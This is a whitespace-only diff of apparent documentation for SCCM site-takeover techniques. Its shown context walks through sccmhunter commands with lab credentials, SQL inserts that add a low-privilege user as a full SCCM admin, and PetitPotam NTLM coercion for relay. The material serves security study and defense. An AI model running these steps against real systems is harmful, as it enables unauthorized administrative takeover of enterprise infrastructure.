@@ -54,13 +54,13 @@ The steps to execute TAKEOVER-1.1 through TAKEOVER-1.3 are the same except that 
 
     ```
     $ python3 sccmhunter.py mssql -dc-ip 192.168.57.100 -d MAYYHEM.LOCAL -u 'lowpriv' -p 'P@ssw0rd' -debug -tu lowpriv -sc ps1 -stacked
-        
-    [13:13:33] DEBUG    [+] Bind successful ldap://192.168.57.100:389 - cleartext                                        
-    [13:13:33] INFO     [*] Resolving lowpriv SID...                                                                     
-    [13:13:33] DEBUG    [+] Found lowpriv SID: S-1-5-21-622943703-4251214699-2177406285-1112                             
-    [13:13:33] INFO     [*] Converted lowpriv SID to 0x010500000000000515000000D75D21256B6364FD4D95C88158040000          
-    [13:13:33] DEBUG    [+] Found domain netbiosname: MAYYHEM                                                            
-    [13:13:33] INFO     [*] Use the following to add lowpriv as a Site Server Admin.                                     
+
+    [13:13:33] DEBUG    [+] Bind successful ldap://192.168.57.100:389 - cleartext
+    [13:13:33] INFO     [*] Resolving lowpriv SID...
+    [13:13:33] DEBUG    [+] Found lowpriv SID: S-1-5-21-622943703-4251214699-2177406285-1112
+    [13:13:33] INFO     [*] Converted lowpriv SID to 0x010500000000000515000000D75D21256B6364FD4D95C88158040000
+    [13:13:33] DEBUG    [+] Found domain netbiosname: MAYYHEM
+    [13:13:33] INFO     [*] Use the following to add lowpriv as a Site Server Admin.
 
     USE CM_ps1; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x010500000000000515000000D75D21256B6364FD4D95C88158040000,'MAYYHEM\lowpriv',0,0,'','','','','ps1');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'MAYYHEM\lowpriv'),'SMS0001R','SMS00ALL','29');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'MAYYHEM\lowpriv'),'SMS0001R','SMS00001','1'); INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'MAYYHEM\lowpriv'),'SMS0001R','SMS00004','1');
     ```
@@ -106,7 +106,7 @@ The steps to execute TAKEOVER-1.1 through TAKEOVER-1.3 are the same except that 
 3. From the attacker host, coerce NTLM authentication from the site server via SMB, targeting the relay server's IP address:
 
     ```
-    # python3 PetitPotam.py -d MAYYHEM.LOCAL -u lowpriv -p P@ssw0rd <NTLMRELAYX_LISTENER_IP> <SITE_SERVER_IP>              
+    # python3 PetitPotam.py -d MAYYHEM.LOCAL -u lowpriv -p P@ssw0rd <NTLMRELAYX_LISTENER_IP> <SITE_SERVER_IP>
 
     Trying pipe lsarpc
     [-] Connecting to ncacn_np:192.168.57.50[\PIPE\lsarpc]
@@ -136,14 +136,14 @@ The steps to execute TAKEOVER-1.1 through TAKEOVER-1.3 are the same except that 
 
     On Linux, using `sccmhunter`:
     ```
-    $ python3 sccmhunter.py  admin -u lowpriv -p <PASSWORD> -ip SITE-SMS          
+    $ python3 sccmhunter.py  admin -u lowpriv -p <PASSWORD> -ip SITE-SMS
 
-    [15:36:54] INFO     [!] Enter help for extra shell commands                                                                                                                                              
+    [15:36:54] INFO     [!] Enter help for extra shell commands
     () (C:\) >> show_admins
-    [15:37:43] INFO     Tasked SCCM to list current SMS Admins.                                                                                                                                              
-    [15:37:44] INFO     Current Full Admin Users:                                                                                                                                                            
-    [15:37:44] INFO     MAYYHEM\sccmadmin                                                                                                                                                                    
-    [15:37:44] INFO     MAYYHEM\lowpriv 
+    [15:37:43] INFO     Tasked SCCM to list current SMS Admins.
+    [15:37:44] INFO     Current Full Admin Users:
+    [15:37:44] INFO     MAYYHEM\sccmadmin
+    [15:37:44] INFO     MAYYHEM\lowpriv
     ```
 
     On Windows, using `SharpSCCM`:
